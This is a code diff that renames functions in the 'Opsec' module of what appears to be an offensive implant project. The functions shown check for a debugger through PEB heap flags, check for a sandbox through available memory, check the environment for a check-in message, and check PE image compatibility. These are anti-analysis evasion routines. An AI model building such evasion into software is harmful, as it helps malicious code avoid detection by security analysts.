@@ -1,17 +1,17 @@
 #include <core/include/opsec.hpp>
 namespace Opsec {
 
-    BOOL SeRuntimeCheck() {
+    BOOL RuntimeChecks() {
         HEXANE
 
         bool success = true;
 #ifndef DEBUG
-        if (Opsec::SeCheckDebugger()) {
+        if (Opsec::CheckDebugger()) {
             Utils::Time::Timeout(SECONDS(1));
             success_(false);
         }
 #endif
-        if (Opsec::SeCheckSandbox()) {
+        if (Opsec::CheckSandbox()) {
             Utils::Time::Timeout(SECONDS(1));
             success_(false);
         }
@@ -38,7 +38,7 @@ namespace Opsec {
         return true;
     }
 
-    BOOL SeCheckDebugger() {
+    BOOL CheckDebugger() {
         HEXANE
 
         PPEB peb    = PEB_POINTER;
@@ -69,7 +69,7 @@ namespace Opsec {
         return ((*HeapFlags & ~HEAP_GROWABLE) || (*HeapForceFlags != 0));
     }
 
-    BOOL SeCheckSandbox() {
+    BOOL CheckSandbox() {
         // todo: check ACPI tables for vm vendors instead of just checking memory
         HEXANE
 
@@ -80,7 +80,7 @@ namespace Opsec {
         return stats.ullAvailPhys > 4;
     }
 
-    BOOL SeCheckEnvironment() {
+    BOOL CheckEnvironment() {
         HEXANE
         // todo: add more information to the checkin message
 
@@ -139,7 +139,7 @@ namespace Opsec {
         return success;
     }
 
-    BOOL SeImageCheckArch(const _executable *const image) {
+    BOOL ImageCheckArch(const _executable *const image) {
         HEXANE
 
         if (image->nt_head->Signature != IMAGE_NT_SIGNATURE) {
@@ -154,7 +154,7 @@ namespace Opsec {
         return true;
     }
 
-    BOOL SeImageCheckCompat(const _executable *const source, const _executable *const target) {
+    BOOL ImageCheckCompat(const _executable *const source, const _executable *const target) {
         HEXANE
 
         if (target->nt_head->FileHeader.Machine != source->nt_head->FileHeader.Machine) {
